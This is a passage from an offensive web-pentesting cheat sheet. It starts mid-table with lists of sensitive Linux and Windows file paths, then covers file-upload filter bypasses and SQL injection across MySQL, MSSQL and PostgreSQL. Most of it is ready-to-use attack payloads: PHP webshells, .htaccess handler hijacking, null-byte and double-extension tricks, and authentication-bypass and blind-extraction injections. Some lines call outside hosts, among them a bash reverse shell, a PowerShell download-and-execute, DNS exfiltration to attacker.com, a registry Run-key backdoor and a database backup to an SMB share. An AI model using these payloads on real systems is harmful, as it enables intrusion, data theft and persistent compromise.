| /proc/version                              | Kernel version                       |
| /root/.aws/credentials                     | AWS credentials                      |
| /root/.docker/config.json                  | Docker credentials                   |
| /usr/local/apache/logs/access_log          | Apache access logs                   |
| /var/log/apache/access_log                 | Apache access logs                   |
| /var/www/html/config.php                   | PHP config                           |
| /var/www/html/.env                         | Environment variables                |
| /var/www/html/.git/config                  | Git configuration                    |
| /var/www/html/wp-config.php                | WordPress configuration              |
| /var/www/logs/access_log                   | Web server access logs               |
| /var/www/logs/access.log                   | Web server access logs               |

**For Windows**

| File Path                                                    | Description                          |
|--------------------------------------------------------------|--------------------------------------|
| C:\Apache\conf\httpd.conf                                     | Apache config                        |
| C:\Apache\logs\access.log                                     | Apache access logs                   |
| C:\Apache\logs\error.log                                      | Apache error logs                    |
| C:\Apache2\conf\httpd.conf                                    | Apache2 config                       |
| C:\Apache2\logs\access.log                                    | Apache2 access logs                  |
| C:\Apache2\logs\error.log                                     | Apache2 error logs                   |
| C:\Apache22\conf\httpd.conf                                   | Apache22 config                      |
| C:\Apache22\logs\access.log                                   | Apache22 access logs                 |
| C:\Apache22\logs\error.log                                    | Apache22 error logs                  |
| C:\Apache24\conf\httpd.conf                                   | Apache24 config                      |
| C:\Apache24\logs\access.log                                   | Apache24 access logs                 |
| C:\Apache24\logs\error.log                                    | Apache24 error logs                  |
| C:\Apache2\logs\error.log                                     | Apache2 error logs                   |
| C:\Documents and Settings\Administrator\NTUser.dat            | Windows user data                    |
| C:\php\php.ini                                                | PHP configuration file               |
| C:\php4\php.ini                                               | PHP configuration file (version 4)   |
| C:\php5\php.ini                                               | PHP configuration file (version 5)   |
| C:\php7\php.ini                                               | PHP configuration file (version 7)   |
| C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf    | Apache config                        |
| C:\Program Files (x86)\Apache Group\Apache\logs\access.log    | Apache access logs                   |
| C:\Program Files (x86)\Apache Group\Apache\logs\error.log     | Apache error logs                    |
| C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf   | Apache2 config                       |
| C:\Program Files (x86)\Apache Group\Apache2\logs\access.log   | Apache2 access logs                  |
| C:\Program Files (x86)\Apache Group\Apache2\logs\error.log    | Apache2 error logs                   |
| C:\Program Files\Apache Group\Apache\conf\httpd.conf          | Apache config                        |
| C:\Program Files\Apache Group\Apache\logs\access.log          | Apache access logs                   |
| C:\Program Files\Apache Group\Apache\logs\error.log           | Apache error logs                    |
| C:\Program Files\Apache Group\Apache2\conf\httpd.conf         | Apache2 config                       |
| C:\Program Files\Apache Group\Apache2\logs\access.log         | Apache2 access logs                  |
| C:\Program Files\Apache Group\Apache2\logs\error.log          | Apache2 error logs                   |
| C:\Program Files\FileZilla Server\FileZilla Server.xml       | FileZilla Server configuration       |
| C:\Program Files\MySQL\my.cnf                                 | MySQL configuration                  |
| C:\Program Files\MySQL\my.ini                                 | MySQL configuration                  |
| C:\Program Files\MySQL\MySQL Server 5.0\my.cnf               | MySQL 5.0 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.0\my.ini               | MySQL 5.0 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.1\my.cnf               | MySQL 5.1 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.1\my.ini               | MySQL 5.1 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.5\my.cnf               | MySQL 5.5 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.5\my.ini               | MySQL 5.5 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.6\my.cnf               | MySQL 5.6 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.6\my.ini               | MySQL 5.6 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.7\my.cnf               | MySQL 5.7 configuration              |
| C:\Program Files\MySQL\MySQL Server 5.7\my.ini               | MySQL 5.7 configuration              |
| C:\Program Files\php\php.ini                                  | PHP configuration file               |
| C:\Users\Administrator\NTUser.dat                             | Windows user data                    |
| C:\Windows\System32\drivers\etc\hosts                         | Hosts file                           |
| C:\Windows\System32\winevt\Logs\Application.evtx              | Application event logs               |
| C:\Windows\System32\winevt\Logs\Security.evtx                 | Security event logs                  |
| C:\Windows\System32\winevt\Logs\System.evtx                   | System event logs                    |
| C:\Windows\win.ini                                            | Windows initialization file          |
| C:\xampp\apache\conf\extra\httpd-xampp.conf                  | XAMPP Apache configuration           |
| C:\xampp\apache\conf\httpd.conf                               | XAMPP Apache configuration           |
| C:\xampp\apache\logs\access.log                               | XAMPP Apache access logs             |
| C:\xampp\apache\logs\error.log                                | XAMPP Apache error logs              |
| C:\xampp\FileZillaFTP\FileZilla Server.xml                   | XAMPP FileZilla configuration        |
| C:\xampp\MercuryMail\MERCURY.INI                             | XAMPP Mercury Mail configuration     |
| C:\xampp\mysql\bin\my.ini                                     | XAMPP MySQL configuration            |
| C:\xampp\php\php.ini                                          | XAMPP PHP configuration              |
| C:\xampp\security\webdav.htpasswd                            | XAMPP WebDav password file           |
| C:\xampp\sendmail\sendmail.ini                                | XAMPP sendmail configuration         |
| C:\xampp\tomcat\conf\server.xml                              | XAMPP Tomcat configuration           |

---

## Blacklisted Extensions

- .jpeg.php
- .jpg.php
- .png.php
- .php
- .php3
- .php4
- .php5
- .php7
- .php8
- .pht
- .phar
- .phpt
- .pgif
- .phtml
- .phtm
- .php%00.gif
- .php\x00.gif
- .php%00.png
- .php\x00.png
- .php%00.jpg
- .php\x00.jpg

---

## Bypassing Filters

**Changing File Extensions: if direct upload of .php files is restricted or filtered, try alternative extensions that might bypass filters.**

# For PHP
- .pHP
- .phps
- .php7
- .php4
- .php5
- .php3
- .xxx

# For ASP(X)
- .aspx
- .asp
- .ashx
- .asmx


1. .htaccess Override (Apache Configuration Hijacking)

If the application allows .htaccess file uploads, exploit it to override MIME type handling:
Steps:

- Create .htaccess payload:
> ```bash
> echo "AddType application/x-httpd-php .dork" > .htaccess
> ```
- Upload the .htaccess file first (ensures handler registration)
- Upload webshell with custom extension:
# Example PHP webshell saved as shell.dork
> ```bash
> echo '<?php system($_GET["cmd"]); ?>' > shell.dork
> ```
- Access shell: https://target.com/uploads/shell.dork?cmd=whoami
- Result: .dork files now execute as PHP despite the extension.

2. Double Extension Bypass

Bypass filters checking only the final extension by using double extensions.
Vulnerable Filter Example:
> ```php
> // This fails on shell.php.jpg because it ends with .jpg
> if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $filename)) {
>    die("Invalid file type");
> }
> ```

Steps:

- 1. Craft double extension payload:

    shell.php.jpg
    shell.php.jpeg  
    shell.php.png
    shell.phtml.gif

- 2. Upload file - server may strip first extension or execute based on internal mapping

- 3. Test execution: https://target.com/uploads/shell.php.jpg

Common server behaviors:

    - Apache: May execute .php.jpg as PHP
    - Nginx: Depends on try_files or MIME config

3. Null Byte & Character Injection

Exploit string termination or parsing differences between application and web server.
Payloads:

| Payload                    | Description                                    |
|----------------------------|------------------------------------------------|
| `shell.php%00.jpg`          | PHP < 5.3.4 null byte truncation               |
| `shell.php%20.jpg`          | Space injection                                |
| `shell.php%0a.jpg`          | Newline injection                              |
| `shell.php%0d0a.jpg`        | CRLF injection                                 |
| `shell.php/.jpg`            | Dot-slash                                      |
| `shell.php\..jpg`           | Backslash escape                               |
| `shell.php…jpg`             | Unicode ellipsis (looks like dot)              |
| `shell.php:jpg`             | Colon separator                                |

Steps:

    - Test null byte (legacy PHP < 5.3.4):

    - shell.php%00.jpg → server sees: shell.php

    - Intercept upload request (Burp/ZAP) and modify filename parameter

    - Upload and test: https://target.com/uploads/shell.php%00.jpg

Detection:

    - Works on old PHP (magic_quotes_gpc=Off)
    - Fails on modern PHP (null byte filtering)

Execution Workflow

1. Recon → Check allowed extensions (.htaccess, images)
2. .htaccess → Register custom handler (.dork → PHP)  
3. Double Ext → shell.php.jpg (bypass suffix checks)
4. Null Byte → shell.php%00.jpg (truncate extension)
5. Verify → Access uploaded shell, execute commands


# Script for all permutations
> ```bash
> for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
>     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
>         echo "shell$char$ext.jpg" >> wordlist.txt
>         echo "shell$ext$char.jpg" >> wordlist.txt
>         echo "shell.jpg$char$ext" >> wordlist.txt
>         echo "shell.jpg$ext$char" >> wordlist.txt
>     done
> done
> ```
    
### MIME (Multipurpose Internet Mail Extensions) Type Spoofing

You can use tools or manual methods to alter the MIME type of a file being uploaded. By inspecting the initial bytes of a file, you can identify its **File Signature** or **Magic Bytes**. For example:

- **GIF87a** or **GIF89a** signifies a GIF image.
- **Plaintext** indicates a Text file.

By altering the initial bytes to match the GIF magic bytes, you can change the MIME type to a GIF image, disregarding the actual content or extension. GIF images start with ASCII printable bytes, which makes them easy to imitate. The string **GIF8** is common to both GIF signatures, simplifying the process of creating a fake GIF image.

# Payload code
> ```php
> GIF89a;
> <?
> system($_GET['cmd']); //or you can insert your complete shell code
> ?>
> //
> ```
or
> ```php
> GIF8
> <?
> system($_GET['cmd']); //or you can insert your complete shell code
> ?>
> ```

# Example
> ```bash
> echo "GIF8" > text.jpg 
> file text.jpg
> text.jpg: GIF image data
> ```

# Code to Test MIME type of uplaoded file
> ```php
> $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
>
> if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
>    echo "Only images are allowed";
>    die();
> }
> ```

---

## SQL Injection

## Basic Commands

- ### MYSQL

| Command                                 | Description                                               |
|-----------------------------------------|-----------------------------------------------------------|
| `LIMIT <row offset>, <number of rows>`  | Display rows based on offset and number                   |
| `COUNT(*)`                              | Display number of rows                                    |
| `RAND()`                                | Generate random number between 0 and 1                    |
| `FLOOR(RAND()*<number>)`                | Print out number part of random decimal number            |
| `SELECT (SELECT DATABASE());`           | Double query (nested) using DATABASE() as an example      |
| `GROUP BY <column name>`                | Summarize rows based on column name                       |
| `CONCAT(<string1>, <string2>, ...)`     | Concatenate strings such as tables, column names          |
| `LENGTH(<string>)`                       | Calculate the number of characters for a given string     |
| `SUBSTR(<string>, <offset>, <length>)`   | Print string character(s) by providing offset and length |
| `ASCII(<character>)`                    | Decimal representation of the character                   |
| `SLEEP(<number of seconds>)`            | Go to sleep for <number of seconds>                       |
| `IF(<condition>, <true action>, <false action>)` | Conditional if statement                     |
| `LIKE "<string>%"`                      | Checks if provided string is present                      |
| `OUTFILE "<url to file>"`               | Dump output of select statement into a file               |
| `LOAD_FILE("<url to file>")`            | Dump the content of a file                                |

- ### MSSQL

| Command | Description |
|---|---|
| `SELECT TOP <number> * FROM <table>` | Equivalent of `LIMIT` for MSSQL |
| `COUNT(*) AS Total` | Display number of rows |
| `NEWID()` | Generate random unique identifier |
| `CAST(<expression> AS <data_type>)` | Cast expression to a specific data type |
| `SELECT DB_NAME()` | Get the current database name |
| `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>'` | Get column names |

**Manual Detection**

- ### Quote Tests
Tests for SQL parsing errors by injecting different types of quotes:

### Quote tests - Testing for SQL parsing errors
| Input | Description |
|---|---|
| `username'` | Single quote – Most common SQL injection test |
| `username"` | Double quote – Used in some database types |
| `username\`` | Backtick – Mainly for MySQL identifier injection |

- ### Logic Tests
Verifies query manipulation possibilities through boolean logic:
| Input | Description |
|---|---|
| `username' OR '1'='1` | Always true condition, often bypasses authentication |
| `username' AND '1'='2` | Always false condition, verifies boolean responses |
| `username' WAITFOR DELAY '0:0:5'--` | Time-based test, checks for blind injection |

- ### Error Tests
Forces database errors to gather information about the backend:
| Input | Description |
|---|---|
| `username' AND 1=convert(int,@@version)--` | Forces type conversion error, reveals MSSQL version |
| `username' AND 1=cast((SELECT @@version) as int)--` | Alternative version check for MSSQL |

**Scanning**

- ### Using Nuclei templates
> ```bash
> nuclei -u "http://target.com" -t sqli/ -severity critical
> # Scans target using Nuclei's SQL injection templates
> # -severity critical: Only runs critical severity checks
> ```

## Error Based
- ### Simple authentication bypass
> ```sql
> <input>' OR 1=1 -- //
> ```
- ### Get the version
> ``` sql
> <input>' OR 1=1 in (SELECT @@version) -- //
> ```

- ### Dump all data:
> ```sql
> <input>' OR 1=1 in (SELECT * FROM <table>) -- //
> # Example
> <input>' OR 1=1 in (SELECT * FROM users) -- //
> ```
- ### Dump specific data:
> ```sql
> <input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //
> # Example
> ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
> ```

- ### MySQL error-based extraction
### Uses GROUP BY and RAND() to force a duplicate key error containing our data
> ```sql
> AND (SELECT 6062 FROM(
>     SELECT COUNT(*),
>     CONCAT(0x716b627071,     # Prefix hex marker
>         (SELECT version()),   # Data we want to extract
>         0x7178707871,        # Suffix hex marker
>         FLOOR(RAND(0)*2))x   # Forces the error
>     FROM INFORMATION_SCHEMA.PLUGINS 
>     GROUP BY x)a)
> ```

- ### Similar technique but extracting database name
> ```sql
> AND (SELECT 2067 FROM (
>     SELECT COUNT(*),
>     CONCAT(0x716b627071,
>         (SELECT database()),  # Extracts current database name
>         0x7178707871,
>         FLOOR(RAND(0)*2))x 
>     FROM INFORMATION_SCHEMA.PLUGINS 
>     GROUP BY x)a)
> ```

- #### MSSQL Time-based data extraction
 ### Uses IF statement with WAITFOR to check conditions
> ```sql
> '; IF (SELECT system_user) = 'sa' WAITFOR DELAY '0:0:5'--
> # Delays response by 5 seconds if current user is 'sa'
> 
> ';IF (SELECT COUNT(name) FROM sysobjects WHERE name = 'sometable')>0 WAITFOR DELAY '0:0:5'--
> # Delays response if table 'sometable' exists
> ```

## Union Based

| MySQL Code | MSSQL Code | Description |
|------------|------------|-------------|
| `<input>' ORDER BY <number> -- -` | `<input>' ORDER BY <number> -- -` | Check Column Count: for both MySQL and MSSQL, determine the number of columns the SELECT query expects. |
| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -` | Table Enumeration: list all the tables from the current database. |
| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -` | Table Enumeration: list all the tables from the current database. |
| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -` | Column Enumeration: list all the columns in a specific table. |
| `<input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -` | `%' UNION SELECT database(), user(), @@version, null, null -- -` | Retrieve Information From Other Databases |
| `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -` | `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -` | Retrieve Information From Other Databases |
| `http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM <tablename> LIMIT 0, 1; -- -` | `http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM <tablename> -- -` | Retrieve Data from Columns: extract data from specific columns. |
| `http://website.com/index.php?id=1 ORDER BY <number> -- -` | `http://website.com/index.php?id=1 ORDER BY <number> -- -` | Determine Number of Columns: find the correct number of columns. |
| `http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -` | `http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -` | Identify Union Columns: identify which columns are injectable. |
| `http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> INTO OUTFILE "<file_path>" -- +` | `http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> EXEC xp_cmdshell 'echo <data> > <filename>'` | Dump Table Content to FileSystem: write content from a table into a file. |
| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -` | Print SQL Version: determine the database version. |
| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, USER(), 4, 5 -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -` | Print User Running the Query: retrieve the user currently running the query. |
| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -` | Print Database Directory: identify the database directory location. |
| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -` | Print Table Names: retrieve a list of table names. |
| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -` | Print Column Names: retrieve a list of column names from a specific table. |
| `http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(<column_name>), 4, 5 FROM <table_name>; -- -` | `http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>, ','), 4, 5 FROM <table_name>; -- -` | Print Content of a Column: extract specific content from a column. |
| `http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -` | `http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -` | Use AND Statement as Comment Alternative: when comments are blocked, use an AND statement. |

- ### Column number enumeration - Finding number of columns in original query
> ```sql
> ' ORDER BY 1--  # Tests if 1 column exists
> ' ORDER BY 2--  # Tests if 2 columns exist
> # Continue incrementing until error occurs, revealing column count
> ```

- ### Alternative column enumeration using UNION
> ```sql
> ' UNION SELECT NULL--       # Tests for 1 column
> ' UNION SELECT NULL,NULL--  # Tests for 2 columns
> # NULL values are used because they can convert to any data type
> ```

- ### Data extraction after finding column count
> ```sql
> ' UNION SELECT username,password FROM users--  
> # Direct extraction of user credentials when 2 columns are confirmed
> 
> ' UNION SELECT table_name,NULL FROM information_schema.tables--
> # Lists all tables in database, NULL to match column count
> 
> ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
> # Lists all columns in users table
> ```

## Blind

- ### Basic Check:
> ```sql
> http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+
> ```

- ### Reflected Input Check: use these commands to determine if the input is being reflected in the output.
> ```sql
> http://<host>/vulnerable-page?param=<input>' AND 1=1 --+
> http://<host>/vulnerable-page?param=<input>' AND '1'='1 --+
> http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
> ```

| MySQL Code | MSSQL Code | Description |
|------------|------------|-------------|
| `http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1)='5') --+` | **Extract Database Version**: Test for the database version using the `SUBSTRING` function. |
| `http://<host>/vulnerable-page?param=<input>' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --+` | `http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a', WAITFOR DELAY '00:00:05', 0) --+` | **Extract Database Name**: Extract the database name using `SUBSTRING` and delay response for a true condition. |
| `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.tables) > 5 --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+` | **Find Table Names**: Extract the first table name from the database. |
| `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 5 --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.columns WHERE object_id = OBJECT_ID('users')) > 5 --+` | **Find Column Names in a Table**: Extract column names from a specific table. |
| `http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --+` | `http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a' --+` | **Retrieve Specific Data**: Extract specific characters from the data using `SUBSTRING` or equivalent logic. |
| `admin' AND SUBSTRING(username,1,1)='a' --+` | `admin' AND SUBSTRING(username,1,1)='a' --+` | **Character Enumeration in Database**: Use character enumeration to brute-force data extraction. |
| `http://<host>/index.php?id=1' AND (SUBSTRING(database(), <offset>, <character_length>))='<character>' --+` | `http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_length>))='<character>' --+` | **Determine Database Name**: Extract the database name using the `SUBSTRING` function. |
| `admin' OR SLEEP(5);--+` | `admin' OR WAITFOR DELAY '00:00:05';--+` | **Login Panel Injection (MySQL & MSSQL)**: Test for time-based SQL injection by delaying the response. |
| `http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+` | `http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+` | **Using Time-Based Conditions**: Use conditions to trigger delays, depending on the true/false evaluation of a statement. |
| `http://<host>/index.php?id=1' AND SLEEP(10) --+` | `http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+` | **Confirm a Time-Based Blind SQL Injection**: Force the application to sleep if the query returns true. |
| `http://<host>/index.php?id=1' AND IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NULL) --+` | `http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELAY '00:00:10', NULL) --+` | **Determine Database Version**: Identify the database version by inducing a delay based on the condition. |

- ### Determine Database Name with wfuzz: this command checks each character of the database name by comparing its ASCII value.
#### Uses ASCII value extraction to determine each character of the database name
> ```bash
>   for i in $(seq 1 10); do 
>   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
> done > <filename.txt> && grep "0m9" <filename.txt
> # Replace <filename.txt> with the name of the file to store results.
> # Replace 10 in $(seq 1 10) with the estimated length of the database name.
> # The FUZZ keyword is used by wfuzz to iterate through ASCII values.
> ```

- ### Determine Table Name with wfuzz: the query retrieves the ASCII value of each character in the first table name.
#### Uses ASCII value extraction to determine each character of the first table name
> ```bash
>    for i in $(seq 1 10); do 
>   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) > --+"; 
> done > <filename.txt> && grep "0m9" <filename.txt
> # Replace table_name and table_schema with the actual names if targeting specific databases or tables.
> # Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
> ```

- ### Determine Column Name with wfuzz: this command retrieves the column names from the targeted table using the information_schema.columns.
#### Uses ASCII value extraction to determine each character of a column name
> ```bash
>    for i in $(seq 1 10); do 
>   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), >NULL) --+"; 
> done > <filename.txt> && grep "0m9" <filename.txt
> # Replace <table_name> with the actual table name you are targeting.
> # Adjust LIMIT 0,1 to retrieve column names for different tables.
> ```

- ### Extract Column Content with wfuzz: he query extracts content from a particular column by comparing ASCII values character by character.
#### Extracts content from a specific column using ASCII value comparison
> ```bash
>   for i in $(seq 1 10); do 
>  wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
>done > <filename.txt> && grep "0m9" <filename.txt
>
># Replace <column_name> with the column you're trying to extract (e.g., username, password).
># Replace <table_name> with the actual table name.
># The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
> ```

- ### Boolean based
> ```sql
> ' AND (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5)='x'--
> ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
> ```

- ### Time based
> ```sql
> ' AND IF(LENGTH(database())>1,SLEEP(5),'false')--
> ' WAITFOR DELAY '0:0:5'--
> ' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE LENGTH(table_name)=6 AND table_schema=database())=1 AND SLEEP(5)--
> ```

**Out-of-Band**

- ### DNS exfiltration (MySQL)
> ```sql
> ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\abc'))-- -
> ```

- ### HTTP request (MSSQL)
> ```sql
> '; exec master..xp_dirtree '//attacker.com/'; --
> ```

**Database Specific**

- ### MYSQL
| Category                     | MySQL Code                                                                 | Description                                      |
|------------------------------|---------------------------------------------------------------------------|--------------------------------------------------|
| **File operations**           | `SELECT LOAD_FILE('/etc/passwd');`                                          | Reads server files into query results           |
|                              | `SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/shell.php';`  | Writes webshell to server                        |
| **System information gathering** | `SELECT @@version;`                                                     | Database version                                |
|                              | `SELECT @@datadir;`                                                       | Data directory location                         |
|                              | `SELECT @@hostname;`                                                      | Server hostname                                 |
|                              | `SELECT @@plugin_dir;`                                                    | Plugin directory location                       |
|                              | `SELECT USER();`                                                           | Current database user                           |
|                              | `SELECT CURRENT_USER();`                                                   | Current system user                             |
| **User defined functions (UDF) for command execution** | `SELECT binary 0x[hex of udf library] INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so';` | First create evil UDF library                   |
|                              | `CREATE FUNCTION sys_exec RETURNS STRING SONAME 'evil.so';`                | Then create function                            |
|                              | `SELECT sys_exec('whoami');`                                               | Execute command                                 |
|                              | `SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1');`           | Execute command                                 |
| **Privilege escalation**      | `SELECT grantee, privilege_type FROM information_schema.user_privileges;`  | List user privileges                            |
|                              | `SELECT host, user, authentication_string FROM mysql.user;`               | List user credentials                           |

- ### MSSQL
| Category                        | SQL Code                                                                                                               | Description                                      |
|----------------------------------|------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------|
| **Command execution via xp_cmdshell** | `EXEC sp_configure 'show advanced options', 1;`                                                                          | Enable advanced options                         |
|                                  | `RECONFIGURE;`                                                                                                          | Apply configuration changes                      |
|                                  | `EXEC sp_configure 'xp_cmdshell', 1;`                                                                                   | Enable xp_cmdshell                               |
|                                  | `RECONFIGURE;`                                                                                                          | Apply configuration changes                      |
|                                  | `EXEC xp_cmdshell 'whoami';`                                                                                             | Execute command (`whoami`)                       |
|                                  | `EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/rev.ps1")';`            | Execute reverse shell using PowerShell          |
| **File operations**             | `EXEC xp_dirtree '\\10.10.10.10\share';`                                                                                | Access SMB share                                 |
|                                  | `BACKUP DATABASE master TO DISK = '\\10.10.10.10\share\backup.bak';`                                                    | Backup database to attacker's SMB share         |
| **Registry operations**         | `EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';`                   | Read registry value                             |
|                                  | `EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','backdoor','REG_SZ','C:\backdoor.exe';` | Write registry value (backdoor)                  |
| **Linked servers abuse**        | `SELECT * FROM OPENQUERY(remote_server, 'SELECT @@version');`                                                           | Query linked server for version                 |
|                                  | `EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT linked_server;`                                          | Enable xp_cmdshell on linked server             |

- ### PostgreSQL
| Category                             | SQL Code                                                                                       | Description                                |
|--------------------------------------|------------------------------------------------------------------------------------------------|--------------------------------------------|
| **File operations**                  | `CREATE TABLE cmd_exec(cmd_output text);`                                                       | Create table for command output           |
|                                      | `COPY cmd_exec FROM PROGRAM 'whoami';`                                                          | Execute command and store output          |
|                                      | `SELECT * FROM cmd_exec;`                                                                       | Read command output                       |
| **Large object operations**          | `SELECT lo_import('/etc/passwd', 12345);`                                                       | Import file as large object               |
|                                      | `SELECT lo_get(12345);`                                                                         | Read large object                         |
|                                      | `SELECT lo_export(12345, '/tmp/passwd');`                                                       | Export large object to file               |
| **Command execution with extensions**| `CREATE EXTENSION IF NOT EXISTS dblink;`                                                        | Enable dblink                             |
|                                      | `SELECT dblink_connect('host=10.10.10.10 user=postgres password=password');`                    | Connect to remote server                  |
|                                      | `SELECT dblink_exec('DROP TABLE IF EXISTS cmd_exec');`                                          | Execute commands on remote server         |
| **User defined functions**           | `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;` | Create UDF for executing system commands  |
